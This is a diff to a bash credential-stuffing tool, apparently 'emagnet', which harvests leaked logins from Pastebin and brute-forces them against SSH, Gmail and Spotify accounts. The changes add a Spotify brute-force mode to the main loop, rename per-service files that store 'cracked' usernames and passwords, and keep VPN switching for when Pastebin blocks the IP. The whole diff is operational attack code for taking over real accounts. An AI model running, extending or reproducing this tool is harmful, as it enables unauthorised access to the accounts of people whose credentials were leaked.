@@ -771,8 +771,8 @@ elif [[ $PBRUTEFORCE = "true" ]]; then
       echo
     analyzer
 elif [[ $SBRUTEFORCE = "true" ]]; then
-    clear
-    banner
+      clear
+      banner
       printf "%20s \e[1mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
       printf "\n%64s \n" | tr ' ' '='
       echo
@@ -814,12 +814,12 @@ SPOTIFY_PASS="$(echo $line|cut -d: -f2)"
              echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
           else
               echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
-              echo -e "================================================================"     >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
-              echo -e "[+] Login Details For SPOTIFY - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"  >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
-              echo -e "[+]------------------------------------------------------------"      >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
-              echo -e "[+] Username: ${SPOTIFY_USER}"                                        >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
-              echo -e "[+] Password: ${SPOTIFY_PASS}"                                        >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
-              echo -e "================================================================\n\n" >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
+              echo -e "================================================================"     >>    $EMAGNETLOGS/cracked-spotify-passwords.txt
+              echo -e "[+] Login Details For SPOTIFY - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"  >>    $EMAGNETLOGS/cracked-spotify-passwords.txt
+              echo -e "[+]------------------------------------------------------------"      >>    $EMAGNETLOGS/cracked-spotify-passwords.txt
+              echo -e "[+] Username: ${SPOTIFY_USER}"                                        >>    $EMAGNETLOGS/cracked-spotify-passwords.txt
+              echo -e "[+] Password: ${SPOTIFY_PASS}"                                        >>    $EMAGNETLOGS/cracked-spotify-passwords.txt
+              echo -e "================================================================\n\n" >>    $EMAGNETLOGS/cracked-spotify-passwords.txt
           fi
 
 done < /tmp/.emagnet-passwords.txt
@@ -895,12 +895,12 @@ fi
 if [[ -n "$attack" ]]; then
     echo -e  "[+] Password Has Been Cracked $mail: \e[1;32m$password\e[0m"
     read -p "[+] Accounts to crack has been set to 1, emagnet has been killed.\n" hey
-    echo -e "================================================================"     >>    $EMAGNETLOGS/cracked-passwords.txt
-    echo -e "[+] Login Details For Gmail - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"    >>    $EMAGNETLOGS/cracked-passwords.txt
-    echo -e "[+]------------------------------------------------------------"      >>    $EMAGNETLOGS/cracked-passwords.txt
-    echo -e "[+] Username: $mail"                                                  >>    $EMAGNETLOGS/cracked-passwords.txt
-    echo -e "[+] Password: $password"                                              >>    $EMAGNETLOGS/cracked-passwords.txt
-    echo -e "================================================================\n\n" >>    $EMAGNETLOGS/cracked-passwords.txt
+    echo -e "================================================================"     >>    $EMAGNETLOGS/cracked-gmail-passwords.txt
+    echo -e "[+] Login Details For Gmail - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"    >>    $EMAGNETLOGS/cracked-gmail-passwords.txt
+    echo -e "[+]------------------------------------------------------------"      >>    $EMAGNETLOGS/cracked-gmail-passwords.txt
+    echo -e "[+] Username: $mail"                                                  >>    $EMAGNETLOGS/cracked-gmail-passwords.txt
+    echo -e "[+] Password: $password"                                              >>    $EMAGNETLOGS/cracked-gmail-passwords.txt
+    echo -e "================================================================\n\n" >>    $EMAGNETLOGS/cracked-gmail-passwords.txt
 fi
 done < /tmp/.emagnet-passwords.txt
     rm /tmp/.emagnet-passwords.txt
@@ -1312,6 +1312,8 @@ if [[ $SBRUTEFORCE = "true" ]]; then
   cp -rn $EMAGNETTEMP/* $EMAGNETALL &> /dev/null
 elif [[ $GBRUTEFORCE = "true" ]]; then
   cp -rn $EMAGNETTEMP/* $EMAGNETALL &> /dev/null
+elif [[ $PBRUTEFORCE = "true" ]]; then
+  cp -rn $EMAGNETTEMP/* $EMAGNETALL &> /dev/null
 else
   mv $EMAGNETTEMP/* $EMAGNETALL &> /dev/null
 fi
@@ -1340,6 +1342,7 @@ fi
 }
 
 dontstopwhenfound() {
+conf
 $BROWSER -dump $PASTEBIN|grep -q "blocked your IP"
 if [[ $? = "0" ]]; then 
    if [[ $VPN = "true" ]]; then 
@@ -1359,13 +1362,17 @@ for (( ; ; )); do
   clear
   banner
   emagnet2
-       if [[ $GBRUTEFORCE = "true" ]]; then 
+  conf
+       if [[ $GBRUTEFORCE = "true" ]]; then
          bruter
          mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
-       elif [[ $SBRUTEFORCE = "true" ]]; then 
+       elif [[ $SBRUTEFORCE = "true" ]]; then
          sshbruter
          mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
-       else 
+       elif [[ $PBRUTEFORCE = "true" ]]; then 
+         spotifybruter
+         mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
+       else
          mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
        fi
 done
@@ -1405,8 +1412,7 @@ dontstopwhenfound
   dontstopwhenfound
   elif [[ $PBRUTEFORCE = "false" ]]; then 
     dontstopwhenfound
- else 
-
+ else
   mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
 fi
 ;;
@@ -1442,20 +1448,19 @@ elif [[ $2 = "ssh" ]]; then
 elif [[ $2 = "spotify" ]]; then
         conf
          printf "Libspotify is deprecated but is required for emagnet bruteforcing\nto work, do you have libspotify installed? (YES/no): "
-read LIBSPOTIFY
-if ! [[ $LIBSPOTIFY = "YES" ]]; then
-echo "Can't continue until libspotify has been installed.."
-echo "Exiting.."
-#exit 1
-fi
-file ./sconsify &> /dev/null
-if [[ $? -ne "0" ]]; then
- if [[ ! -f "./sconsify" ]]; then
-   echo "Sconsify is required to be installed before we attacking targets.."
- fi
-
-   read -p "Download and install sconsify (y/N): " installsconsify
-         if [[ $installsconsify -eq "y" ]]; then
+         read LIBSPOTIFY
+         if ! [[ $LIBSPOTIFY = "YES" ]]; then
+         echo "Can't continue until libspotify has been installed.."
+         echo "Exiting.."
+         #exit 1
+         fi
+         file ./sconsify &> /dev/null
+         if ! [[ $? -ne "0" ]]; then
+         if [[ ! -f "./sconsify" ]]; then
+         echo "Sconsify is required to be installed before we attacking targets.."
+         fi
+           read -p "Download and install sconsify (y/N): " installsconsify
+             if [[ $installsconsify -eq "y" ]]; then
                 wget -q "https://github.com/fabiofalci/sconsify/releases/download/next-20180428/linux-x86_64-sconsify-0.6.0-next.zip"
                 unzip linux-x86_64-sconsify-0.6.0-next.zip
                 chmod +x sconsify
@@ -1470,7 +1475,6 @@ if [[ $? -ne "0" ]]; then
               exit 1
         fi
 fi
-
         sed -i 's/PBRUTEFORCE=false/PBRUTEFORCE=true/g' $CONF
         conf
         if [[ $PBRUTEFORCE = "true" ]]; then
